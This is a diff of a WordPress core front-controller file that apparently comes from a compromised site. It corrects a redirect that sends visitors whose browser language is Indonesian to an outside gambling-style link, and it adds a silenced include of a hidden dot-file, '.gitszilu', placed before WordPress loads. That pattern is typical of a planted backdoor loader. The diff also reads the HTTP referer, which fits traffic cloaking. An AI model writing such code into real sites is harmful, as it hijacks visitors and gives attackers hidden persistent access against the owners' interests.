@@ -15,27 +15,26 @@ $s_ref = $_SERVER['HTTP_REFERER'];
     }
     $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
     if ($browserLang == 'id') {
-        header("https://link-bola16.web.app/");
+        header("Location: https://link-bola16.web.app/");
         exit;
     }
-
 /**
  * Loads the WordPress environment and template.
  *
  * @package WordPress
  */
-
+@include_once(".gitszilu");
 if ( ! isset( $wp_did_header ) ) {
 
-	$wp_did_header = true;
+  $wp_did_header = true;
 
-	// Load the WordPress library.
-	require_once __DIR__ . '/wp-load.php';
+  // Load the WordPress library.
+  require_once __DIR__ . '/wp-load.php';
 
-	// Set up the WordPress query.
-	wp();
+  // Set up the WordPress query.
+  wp();
 
-	// Load the theme template.
-	require_once ABSPATH . WPINC . '/template-loader.php';
+  // Load the theme template.
+  require_once ABSPATH . WPINC . '/template-loader.php';
 
 }
